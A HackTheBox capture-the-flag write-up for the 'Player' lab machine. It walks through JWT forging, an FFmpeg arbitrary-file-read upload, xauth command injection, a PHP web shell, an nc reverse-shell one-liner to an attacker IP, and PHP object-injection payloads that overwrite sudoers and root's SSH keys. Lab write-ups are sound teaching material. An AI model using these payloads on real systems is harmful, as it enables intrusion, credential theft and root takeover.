---
title: "HTB-Player"
excerpt: "Player was fun and realistic box that had sensitive file and source code exposure, exploiting FFMpeg reading arbitrary files vulnerability..."
related: false
date: 2020-01-18
categories:
  - HackTheBox
#  - Uncategorized
#tags:
#  - related posts
#  - layout
#img: /assets/images/craft/banner.png
---

![/assets/images/Player/Untitled.png](/assets/images/Player/Untitled.png)

Player was fun and realistic box that had sensitive file and source code exposure, exploiting FFMpeg reading arbitrary files vulnerability and doing root in two different ways

# Box Overview

- Bruteforcing subdomains to find a chat about Pentesting report results.
- Using this info to find sensitive files and source code exposure.
- Using source code to bypass product release timer.
- Exploiting FFMpeg to read the sensitive files I found.
- logged in to a restricted shells as telegen.
- Found public exploit for that shell to read files.
- Exploiting Codiad to get a reverse shell as www-data.
- Getting root first way through writing PHP code in a file that root runes
- Getting root second way through PHP Object Injection.

# Recon

## Nmap

    # Nmap 7.80: nmap -sT -p- -vv -n -Pn --min-rate 10000 -oN nmap/alltcp 10.10.10.145
    Increasing send delay for 10.10.10.145 from 0 to 5 due to 246 out of 818 dropped probes since last increase.
    Warning: 10.10.10.145 giving up on port because retransmission cap hit (10).
    Increasing send delay for 10.10.10.145 from 640 to 1000 due to 606 out of 2019 dropped probes since last increase.
    Nmap scan report for 10.10.10.145
    Host is up, received user-set (0.10s latency).
    Scanned at 2020-01-02 11:42:33 EET for 31s
    Not shown: 60810 closed ports, 4722 filtered ports
    Reason: 60810 conn-refused and 4722 no-responses
    PORT     STATE SERVICE REASON
    22/tcp   open  ssh     syn-ack
    80/tcp   open  http    syn-ack
    6686/tcp open  unknown syn-ack

    # Nmap done: 1 IP address (1 host up) scanned in 31.54 seconds

    # Nmap 7.80: nmap -sC -sV -Pn -p 22,80,6686 -oN nmap/scripts 10.10.10.145
    Nmap scan report for 10.10.10.145
    Host is up (0.098s latency).

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
    |   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
    |   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
    |_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
    80/tcp   open  http    Apache httpd 2.4.7
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: 403 Forbidden
    6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
    Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds

## Web

### Main

    root@kali:# gobuster dir -u http://10.10.10.145 -w /usr/share/seclists/Discovery/Web-Content/common.txt -k --wildcard -s 200 -f
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.145
    [+] Threads:        10
    [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
    [+] Status codes:   200
    [+] User Agent:     gobuster/3.0.1
    [+] Add Slash:      true
    [+] Timeout:        10s
    ===============================================================
    2020/01/18 13:37:04 Starting gobuster
    ===============================================================
    /launcher/ (Status: 200)

Looks like a count down for a product release.

![/assets/images/Player/Untitled%201.png](/assets/images/Player/Untitled%201.png)

Entering email and capturing the request in burp show something interesting

    GET /launcher/dee8dc8a47256c64630d803a4c40786c.php HTTP/1.1
    Host: player.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://player.htb/launcher/index.html
    Connection: close
    Upgrade-Insecure-Requests: 1

    HTTP/1.1 302 Found
    Date: Thu, 02 Jan 2020 11:58:58 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.26
    Set-Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; expires=Sat, 01-Feb-2020 11:58:58 GMT; Max-Age=2592000; path=/
    Location: index.html
    Content-Length: 0
    Connection: close
    Content-Type: text/html

Looking for cookies i found access cookie which was JWT

    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU

There is a hidden PHP page and there is a set cookie in the response.

That cookie is JWT.

    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU

    #Header
    {"typ": "JWT", "alg": "HS256"}

    #Payload
    {"project": "PlayBuff", "access_code": "C0B137FE2D792459F26FF763CCE44574A5B5AB03"}

I tried to change algo to None or even crack it with rockyou but both did not work and even if thy worked i would still need right access_code to bypass check. So now, I have to somehow find a secret for that JWT and correct access code if we want to proceed with its exploit.

Another thing, While my Burp was intercepting traffic I noticed weird request being made my the web app.

    GET /launcher/dee8dc8a47256c64630d803a4c40786e.php HTTP/1.1
    Host: player.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://player.htb/launcher/
    X-Requested-With: XMLHttpRequest
    Connection: close
    Content-Length: 2

    HTTP/1.1 200 OK
    Date: Thu, 02 Jan 2020 12:01:49 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.26
    Content-Length: 16
    Connection: close
    Content-Type: text/html

    Not released yet

So for now we have found 2 PHP pages on the main domain

    /dee8dc8a47256c64630d803a4c40786c.php
    /dee8dc8a47256c64630d803a4c40786e.php

I saw that its the same except the last character c to e .So, I tried to wfuzz with the whole alphabet

    root@kali:# wfuzz -c -u http://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786FUZZ.php -w /usr/share/seclists/Fuzzing/char.txt --hc 404

    Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

    ********************************************************
    * Wfuzz 2.4 - The Web Fuzzer                           *
    ********************************************************

    Target: http://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786FUZZ.php
    Total requests: 26

    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                                                  
    ===================================================================

    000000003:   302        0 L      0 W      0 Ch        "c"                                                                                      
    000000005:   200        0 L      3 W      16 Ch       "e"                                                                                      
    000000007:   200        0 L      0 W      0 Ch        "g"                                                                                      

    Total time: 0.359006
    Processed Requests: 26
    Filtered Requests: 23
    Requests/sec.: 72.42210

Wfuzz found

    dee8dc8a47256c64630d803a4c40786g.php

But curling it literally gave nothing.

So lets keep going with our Recon Phase and enumerate subdomains.

### Subdomain Discovery

Found 3 subdomains.

    root@kali:# wfuzz -c -u http://player.htb -H "Host: FUZZ.player.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 --hc 403

    Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

    ********************************************************
    * Wfuzz 2.4 - The Web Fuzzer                           *
    ********************************************************

    Target: http://player.htb/
    Total requests: 19983

    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                                                  
    ===================================================================

    000000019:   200        86 L     229 W    5243 Ch     "dev"                                                                                    
    000000067:   200        63 L     180 W    1470 Ch     "staging"                                                                                
    000000070:   200        259 L    714 W    9513 Ch     "chat"

    000000019:   200        86 L     229 W    5243 Ch     "dev"                                                                                    
    000000067:   200        63 L     180 W    1470 Ch     "staging"                                                                                
    000000070:   200        259 L    714 W    9513 Ch     "chat"

Lets start enumerating them one by one.

### Chat

This chat had something interesting about a Pentest report.

So that was a hint to look for sensitive files exposure on Staging and source code exposure  on Main.

![/assets/images/Player/Untitled%202.png](/assets/images/Player/Untitled%202.png)

### Dev

Just a login page of a public web application and gobuster didn't find anything interesting. Tried common and default creds didn't work.

![/assets/images/Player/Untitled%203.png](/assets/images/Player/Untitled%203.png)

### Staging

So from Chat, There must be something leaking sensitive files Here.

![/assets/images/Player/Untitled%204.png](/assets/images/Player/Untitled%204.png)

Going for Contract Core Team and filling with dumb email, message and submitting we got that error.

![/assets/images/Player/Untitled%205.png](/assets/images/Player/Untitled%205.png)

    array(3) {
      [0]=>
      array(4) {
        ["file"]=>
        string(28) "/var/www/staging/contact.php"
        ["line"]=>
        int(6)
        ["function"]=>
        string(1) "c"
        ["args"]=>
        array(1) {
          [0]=>
          &string(9) "Cleveland"
        }
      }
      [1]=>
      array(4) {
        ["file"]=>
        string(28) "/var/www/staging/contact.php"
        ["line"]=>
        int(3)
        ["function"]=>
        string(1) "b"
        ["args"]=>
        array(1) {
          [0]=>
          &string(5) "Glenn"
        }
      }
      [2]=>
      array(4) {
        ["file"]=>
        string(28) "/var/www/staging/contact.php"
        ["line"]=>
        int(11)
        ["function"]=>
        string(1) "a"
        ["args"]=>
        array(1) {
          [0]=>
          &string(5) "Peter"
        }
      }
    }
    Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php

So, That's was the sensitive file exposing they were talking abut in Chat

    /var/www/backup/service_config
    /var/www/staging/fix.php

But still not helpful so, Lets keep enumerating.

### Back again to Main

From Chat we knew that there should be a source code leakage vulnerability here. The only PHP pages we found were

    http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786e.php
    http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
    http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786g.php

So trying things like ~, .bak, .swp. I found

    root@kali:# curl  http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
    <?php
    require 'vendor/autoload.php';

    use \Firebase\JWT\JWT;

    if(isset($_COOKIE["access"]))
    {
            $key = '_S0_R@nd0m_P@ss_';
            $decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
            if($decoded->access_code === "0E76658526655756207688271159624026011393")
            {
                    header("Location: 7F2xxxxxxxxxxxxx/");
            }
            else
            {
                    header("Location: index.html");
            }
    }
    else
    {
            $token_payload = [
              'project' => 'PlayBuff',
              'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
            ];
            $key = '_S0_R@nd0m_P@ss_';
            $jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
            $cookiename = 'access';
            setcookie('access',$jwt, time() + (86400 * 30), "/");
            header("Location: index.html");
    }

    ?>

Thats great, This source code revealed three things

First, JWT secret.

    #In source code the key is getting **strtr** and decoded before being used with JWT so useing the same code to echo the key
    <?php
    $key = '_S0_R@nd0m_P@ss_';
    echo strtr($key, '-_', '+/');
    ?>

    #The key base64 Encoded
    /S0/R@nd0m/P@ss/

Second, an access_code.

    0E76658526655756207688271159624026011393

Third, a hidden directory that what we will get redirected to with the right JWT token.

    7F2xxxxxxxxxxxxx/

# Bypass Release Count down

## JWT Forging

So right now I will create a new JWT with the access_code from the source code to bypass the counter.

To do that there is a lot of ways. the easiest is to use this website.

[JWT.IO](https://jwt.io/)

    import jwt
    from base64 import b64decode

    key = b64decode("/S0/Rnd0m/Pssw==")
    encoded_jwt = jwt.encode({"project": "PlayBuff", "access_code": "0E76658526655756207688271159624026011393"}, key, algorithm='HS256')
    print(encoded_jwt)

The new JWT

    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE

    GET /launcher/dee8dc8a47256c64630d803a4c40786c.php HTTP/1.1
    Host: player.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://player.htb/launcher/
    Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE
    X-Requested-With: XMLHttpRequest
    Connection: close
    Content-Length: 2

    HTTP/1.1 302 Found
    Date: Thu, 02 Jan 2020 12:49:18 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.26
    Location: 7F2dcsSdZo6nj3SNMTQ1/
    Content-Length: 0
    Connection: close
    Content-Type: text/html

# PlayBuff Product

![/assets/images/Player/Untitled%206.png](/assets/images/Player/Untitled%206.png)

Looking at that webapp it says Compress and Secure your media and there is a file upload

First i always upload a jpeg to see how the webapp handles it and if i can find where it is stored then i see if i can upload php script or anything

So, I uploaded a jpeg

![/assets/images/Player/Untitled%207.png](/assets/images/Player/Untitled%207.png)

![/assets/images/Player/Untitled%208.png](/assets/images/Player/Untitled%208.png)

It got converted to avi!

![/assets/images/Player/Untitled%209.png](/assets/images/Player/Untitled%209.png)

Opening that video its a video of my pic!

![/assets/images/Player/Untitled%2010.png](/assets/images/Player/Untitled%2010.png)

Doing file on that video I found

    root@kali:# file 1606973041.avi
    1606973041.avi: RIFF (little-endian) data, AVI, 208 x 243, 25.00 fps, video: FFMpeg MPEG-4

So, Looks like the webapp process the uploaded media files with FFMpeg!

After some searching I found a vulnerabilities in FFMpeg I found that there is an exploit for it to be able to read arbitrary files. For more explanation Visit [This](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS)!

## FFMpeg File reading

I have used the script from the above website and it did the job but it was a little messy with some garbage. I found out after that there is another [script](https://hackerone.com/reports/237381) that have more cleaner output.

### Reading /etc/passwd

    gen_avi_bypass.py file://etc/passwd etc-passwd.avi

Works just fine.

![/assets/images/Player/Untitled%2011.png](/assets/images/Player/Untitled%2011.png)

So, Now I will read the sensitive files I found on Staging

### Reading /var/www/staging/fix.php

I tried to read it but the exploit kept faling and i get empty video back.

### Reading /var/www/backup/service_config

![/assets/images/Player/Untitled%2012.png](/assets/images/Player/Untitled%2012.png)

There is creds in service_config

    telegen:d-bC|jC!2uepS/w

lets try to ssh with them!

Faild on port 22 but worked on port 6686

and we got our shell

    root@kali:# ssh telegen@player.htb -p 6686
    telegen@player.htb's password:
    Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
    Environment:
      USER=telegen
      LOGNAME=telegen
      HOME=/home/telegen
      PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
      MAIL=/var/mail/telegen
      SHELL=/usr/bin/lshell
      SSH_CLIENT=10.10.14.220 46160 6686
      SSH_CONNECTION=10.10.14.220 46160 10.10.10.145 6686
      SSH_TTY=/dev/pts/1
      TERM=screen-256color
    ========= PlayBuff ==========
    Welcome to Staging Environment

    telegen:~$ ls
    *** forbidden command: ls
    telegen:~$
             clear    exit     help     history  lpath    lsudo    
    telegen:~$

And we got a restricted shell. After enumerating it for a while and trying to escape it. I Couldn't do that.

Checking for vulnerabilities for that version of OpenSSH I found a some.

    root@kali:# searchsploit OpenSSH 7.2
    ----------------------------------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                                                   |  Path
                                                                                                                     | (/usr/share/exploitdb/)
    ----------------------------------------------------------------------------------------------------------------- ----------------------------------------
    OpenSSH 7.2 - Denial of Service                                                                                  | exploits/linux/dos/40888.py
    OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                          | exploits/multiple/remote/39569.py
    OpenSSH 7.2p2 - Username Enumeration                                                                             | exploits/linux/remote/40136.py
    OpenSSHd 7.2p2 - Username Enumeration                                                                            | exploits/linux/remote/40113.txt
    ----------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result

# Xauth Command Injection

The one that seems promising is Xauth Authenticated Command Injection.

Trying it

    root@kali:~/files/htb/boxes//assets/images/Player/ssh-6686# python exploit.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
    INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686
    INFO:__main__:connected!
    INFO:__main__:
    Available commands:
        .info
        .readfile <path>
        .writefile <path> <data>
        .exit .quit
        <any xauth command or type help>

    #>

    INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686         
    INFO:__main__:connected!        
    INFO:__main__:                        
    Available commands:                
        .info
        .readfile <path>
        .writefile <path> <data>
        .exit .quit
        <any xauth command or type help>

    #>

we can read user.txt

    #> .readfile user.txt
    DEBUG:__main__:auth_cookie: 'xxxx\nsource user.txt\n'
    DEBUG:__main__:dummy exec returned: None
    INFO:__main__:30e4....

Now we couldn't read fix.php with ffmpeg exploit. Lets try to read it now

    #> .readfile /var/www/staging/fix.php
    DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
    DEBUG:__main__:dummy exec returned: None
    INFO:__main__:<?php
    class
    protected
    protected
    protected
    public
    return
    }   
    public            
    if($result
    static::passed($test_name);
    }                      
    static::failed($test_name);
    }
    }      
    public
    if($result          
    static::failed($test_name);
    }      
    static::passed($test_name);
    }   
    }                   
    public
    if(!$username){
    $username
    $password
    }
    //modified
    //for
    //fix
    //peter
    //CQXpm\z)G5D#%S$y=
    }
    public
    if($result
    static::passed($test_name);
    ...(Snip)...

That's part of the the code. It contains creds to peter

    peter:CQXpm\z)G5D#%S$y=

When i read /etc/passwd i did not find a user with name peter in it.

    #> .readfile /etc/passwd
    DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
    DEBUG:__main__:dummy exec returned: None
    INFO:__main__:root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    libuuid:x:100:101::/var/lib/libuuid:
    syslog:x:101:104::/home/syslog:/bin/false
    messagebus:x:102:106::/var/run/dbus:/bin/false
    landscape:x:103:109::/var/lib/landscape:/bin/false
    telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    mysql:x:105:113:MySQL
    colord:x:106:116:colord
    staged-dev:x:4000000000:1001::/home/staged-dev:/bin/sh

So, That's mean those creds are not for ssh. and then I remembered that there is another login page we found on Dev.

# Codiad

The creds worked on that login page on dev. Enumerating that I found that this is [Codiad](https://github.com/Codiad/Codiad). A web based IDE

![/assets/images/Player/Untitled%2013.png](/assets/images/Player/Untitled%2013.png)

Trying to create a new project in /tmp/yuns we got that error.

![/assets/images/Player/Untitled%2014.png](/assets/images/Player/Untitled%2014.png)

So lets create it there instead. And we can just upload files to that project on the box

![/assets/images/Player/Untitled%2015.png](/assets/images/Player/Untitled%2015.png)

I upload PHP snippet to execute code and then get my reverse shell.

    <?php system($_REQUEST['cmd']); ?>

and then i inercept the request with Burp and execute commands with burp

    POST /home/yuns/cmd.php HTTP/1.1
    Host: dev.player.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: 97c737d7256edaf18c3552b469f00d9d=lgq8pjvfovjrf4jp64hs077mf2
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6

    cmd=id

    HTTP/1.1 200 OK
    Date: Fri, 03 Jan 2020 13:36:47 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.26
    Content-Length: 55
    Connection: close
    Content-Type: text/html

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Now lets get a reverse shell from that

    POST /home/yuns/cmd.php HTTP/1.1
    Host: dev.player.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: 97c737d7256edaf18c3552b469f00d9d=lgq8pjvfovjrf4jp64hs077mf2
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 88

    cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.15.38+9001+>/tmp/f

Spawn a TTY and then proceed to the Privilege escalation part

    root@kali:# nc -lvnp 9001
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.145.
    Ncat: Connection from 10.10.10.145:9582.
    $ python -c 'import pty;pty.spawn("/bin/bash")'

Then Ctr+Z

    root@kali:~# stty raw -echo

Then write fg

and u wont see it. Just press two enter and u will get back to ur shell with full TTY , TAB auto complication and u can Ctr+C out of hanged commands.

# Privilege Escalation

I will show two ways to get root on that box.

## Writable PHP file

Running pspy on the box showed that root runs a PHP script.

    2020/01/03 19:23:01 CMD: UID=0    PID=5730   | /usr/bin/php /var/lib/playbuff/buff.php

Looking at the script i found that

    include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");

That's the file I found earlier. That file we have all permissions on we can write PHP code in it and it will get executed by root. So, I will put PHP reverse Shell into it.

And after some time i got root shell.

    root@kali:# nc -lvnp 9001
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.145.
    Ncat: Connection from 10.10.10.145:37258.
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # cat root.txt
    7dfc49...

## PHP Object Injection

I'm not gonna explain PHP object Injection Here because it had been explained in a lot of articles out there one of them is [This](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/) Which I used to understand and exploit it

The vulnerability is still in buff.php. Read comments in codes for some explanation about the attack.

    <?php                                                                                                                                                     
    include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"); # This is the Include I exploited in the first method.                                                                                  
    class playBuff                                                                                                                                            
    {              
            public $logFile="/var/log/playbuff/logs.txt"; # Path to file
            public $logData="Updated"; # Data to be written into file

            public function __wakeup() # Here is a PHP magic method.
            {
                    file_put_contents(__DIR__."/".$this->logFile,$this->logData); # As we see it puts contents in a file in the same directory only!
            }                                                                    
    }                                                                            
    $buff = new playBuff();                                                      
    $serialbuff = serialize($buff);
    $data = file_get_contents("/var/lib/playbuff/merge.log"); # That is the file the code reads Seriliezed data from.             
    if(unserialize($data)) # Here is Where our payload from merge.log gets unserliezed and executed. It is importent to be after the class and object has been declerd.
    ...(Snip)...

First things first, The file we need  is owned by telegen.

    -rw-------  1 telegen telegen   13 Jan  3 19:29 merge.log

su to telegen and execute bash instead of the restricted shell he has

    www-data@player:/var/lib/playbuff$ su telegen -s bash
    Password:
    telegen@player:/var/lib/playbuff$

now we can put our payload into merge.log and wait for it get unserialize and executed.

To exploit this what we can do as root is to write data into a file. there is two ways to do this

### Writing in suddoers

To Generate the payload i used a snipet from buff.php code to print the serialized data for me

    <?php
    class playBuff                                                                                                                                            
    {              
            public $logFile="../../../../../../../../etc/sudoers"; # Path to file
            public $logData="telegen ALL=(ALL)ALL"; # Data to be written into file

            public function __wakeup()
            {
                    file_put_contents(__DIR__."/".$this->logFile,$this->logData); # As we see it puts contents in a file in the same directory only!
            }                                                                    
    }                                                                            
    $buff = new playBuff();                                                      
    $serialbuff = serialize($buff);
    print $serialbuff;
    ?>

This is the generated payload

    O:8:"playBuff":2:{s:7:"logFile";s:35:"../../../../../../../../etc/sudoers";s:7:"logData";s:20:"telegen ALL=(ALL)ALL";}

Putting this payload into merg.log and waiting for root to execute the script.

And now we have sudo ALL

    telegen@player:/var/lib/playbuff$ sudo -l
    [sudo] password for telegen:
    User telegen may run the following commands on player:
        (ALL) ALL
    telegen@player:/var/lib/playbuff$ sudo bash
    root@player:/var/lib/playbuff# id
    uid=0(root) gid=0(root) groups=0(root)

### Writting SSH Key

We will use the same payload generator this time but with the ssh public key and root's authorized key path

and here is the new payload

    O:8:"playBuff":2:{s:7:"logFile";s:49:"../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:390:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI3yxT+1bJnD4Er8lGjdegZ3oFv6Sv6yFZCb8LHySr3oBEdIxk1fOgz13H1Vm8pUpNepJvXh87+B+t2AsXUjLpfUmEJmS7gpbO9wYfdFz5xKClVf5Pg4NrK3P0RNSEPuWcoscpJqfdFaFmDBhoNJEff5fHo/tnUCDzPd5gsBz5GL/9xXRI/enPc2xmRvg7GtVGcUK+6oyxAz8JjAzrT0WqtkBJexndiE+H++mKjOBylTkuuAht1kMbS07MtjYT5VpNlEKkdZ0hOiX7AZlONf3AwsqoVXltZarxxQmrcKe67f72TEBcr/FQerZSR7f6QL45H+/057F9OQAPY2GT81cZ root@kali";}

After sometime We can SSH into root

    root@kali:~# ssh -i root.key root@player.htb
    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-148-generic x86_64)

     * Documentation:  https://help.ubuntu.com/

      System information as of Fri Jan  3 19:44:19 IST 2020

      System load: 0.08               Memory usage: 7%   Processes:       171
      Usage of /:  14.5% of 17.59GB   Swap usage:   0%   Users logged in: 0

      Graph this data and manage this system at:
        https://landscape.canonical.com/

    Last login: Fri Aug 23 22:21:38 2019
    root@player:~# id
    uid=0(root) gid=0(root) groups=0(root)
